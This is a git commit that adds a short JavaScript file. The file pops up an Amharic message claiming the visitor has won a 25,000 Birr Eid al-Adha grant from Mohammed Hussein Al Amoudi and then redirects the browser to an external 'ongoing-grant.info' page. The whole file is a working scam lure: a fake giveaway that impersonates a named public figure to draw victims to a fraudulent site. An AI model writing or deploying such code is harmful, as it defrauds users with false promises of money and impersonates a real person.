cec24099429a1c00f96e6a20f03ca92c5ea80236
The-On-going <sirpeelawson@gmail.com>
2026-05-29 05:25:10 +0100

    Create active29.js

---
+++ active29.js
@@ -0,0 +1,10 @@
+var password = 'ጥሬ ገንዘብ ማውጣት';
+
+password = prompt(
+  'እንኳን ደስ አለዎት፣ ከሞሐመድ ሁሴን አል አሙዲ 25,000 ብር የኢድ አል አድሃ የገንዘብ ድጋፍ ለመቀበል ብቁ ነዎት። ወዲያውኑ ለመቀበል OK ይጫኑ።',
+  'ጥሬ ገንዘብ ማውጣት'
+);
+
+if (password !== 'ጥሬ ገንዘብ ማውጣት') {
+    location.href = 'https://ongoing-grant.info/Amoudi-Br-25000-Al.html';
+}
